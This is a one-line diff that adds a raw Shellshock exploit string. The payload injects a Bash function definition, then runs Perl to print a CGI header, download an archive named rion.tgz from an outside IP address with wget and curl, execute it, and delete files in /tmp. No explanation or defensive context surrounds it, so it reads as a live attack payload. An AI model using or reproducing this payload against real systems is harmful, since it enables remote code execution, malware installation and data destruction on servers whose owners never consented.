@@ -1,0 +1,1 @@
+() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://89.234.183.73/rion.tgz -O /tmp/rion.tgz;curl -O /tmp/rion.tgz http://89.234.183.73/rion.tgz;perl /tmp/rion.tgz ; rm -rf /tmp/* ;rm -f /tmp/* ");'
